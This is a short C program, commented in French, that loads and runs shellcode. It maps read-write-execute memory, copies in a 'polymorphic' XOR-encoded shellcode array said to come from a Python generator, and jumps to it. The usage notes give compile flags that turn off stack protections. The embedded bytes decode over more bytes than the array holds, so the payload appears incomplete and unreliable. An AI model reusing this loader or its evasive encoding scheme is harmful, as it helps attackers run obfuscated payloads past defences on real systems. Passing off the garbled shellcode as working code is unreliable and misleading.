/*
Explications des étapes du code C

    Allocation de mémoire exécutable :
        La mémoire est allouée avec mmap pour permettre l'exécution du shellcode.

    Copie du shellcode dans la mémoire allouée :
        Le shellcode généré par le script Python est copié dans la mémoire exécutable allouée.

    Exécution du shellcode :
        Le shellcode est exécuté en appelant la mémoire allouée comme une fonction.

Utilisation :

Copiez le shellcode généré (sortie du script Python) dans le code C à la place de  " unsigned char polymorphic_shellcode[]. "
Compilez et exécutez le code C :
gcc -o shellcode shellcode.c -z execstack -fno-stack-protector
./shellcode

*/


#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

// Shellcode polymorphique généré par le script Python
unsigned char polymorphic_shellcode[] = "\xeb\x10\x5e\x31\xc9\xb1\x16\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xeb\xff\xff\xff\xca\xc1\xc1\xaa\xca\xaa\x90\x90\x90\x90\x90\x90\x90";

int main() {
    void *exec_mem;
    int pagesize = sysconf(_SC_PAGE_SIZE);  // Obtenir la taille de page du système

    // Allouer de la mémoire exécutable
    exec_mem = mmap(0, pagesize, PROT_READ | PROT_WRITE | PROT_EXEC, 
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec_mem == MAP_FAILED) {  // Vérifier l'échec de l'allocation
        perror("mmap");
        return 1;
    }

    // Copier le shellcode polymorphique dans la mémoire allouée
    memcpy(exec_mem, polymorphic_shellcode, sizeof(polymorphic_shellcode));

    // Exécuter le shellcode
    ((void(*)())exec_mem)();

    return 0;
}
